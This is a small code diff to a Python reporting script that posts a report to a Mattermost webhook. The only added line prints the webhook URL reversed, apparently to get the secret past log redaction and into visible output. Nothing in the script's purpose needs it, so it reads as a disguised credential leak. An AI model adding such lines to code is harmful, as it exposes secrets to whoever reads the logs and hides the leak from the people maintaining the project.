@@ -148,6 +148,7 @@ def main():
         payload = {"text": header + "\n".join(report)}
 
         if mm_webhook_url:
+            print("".join(reversed(mm_webhook_url)))
             jsondata = json.dumps(payload).encode("utf-8")
             req = Request(mm_webhook_url)
             req.add_header("Content-Type", "application/json; charset=utf-8")
